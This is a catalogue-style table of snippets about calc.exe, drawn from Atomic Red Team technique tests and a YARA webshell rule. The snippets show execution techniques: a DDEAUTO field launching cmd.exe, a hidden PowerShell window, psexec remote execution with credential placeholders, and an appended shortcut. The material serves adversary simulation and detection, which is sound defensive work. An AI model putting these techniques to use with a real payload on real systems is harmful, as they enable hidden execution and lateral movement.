[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.013.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.013/T1546.013.md) | \| exe_path \| Path the malicious executable \| Path \| calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.009.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.009/T1547.009.md) | Upon execution, calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.009.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.009/T1547.009.md) | echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1559.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1559.002/T1559.002.md) | {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  } | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1559.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1559.002/T1559.002.md) | 9. DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md) | Upon execution a hidden PowerShell window will launch calc.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md) | \| powershell_command \| Command to launch calc.exe from a hidden PowerShell Window \| String \| powershell.exe -WindowStyle hidden calc.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1569.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md) | Upon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost). | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1569.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md) | #{psexec_exe} \\#{remote_host} -u #{user_name} -p #{password} -accepteula "C:\Windows\System32\calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md) | Upon execution, calc.exe will be opened. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-webshells.yar) | $s7 = "\"\"%windir%\\\\calc.exe\"\")" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


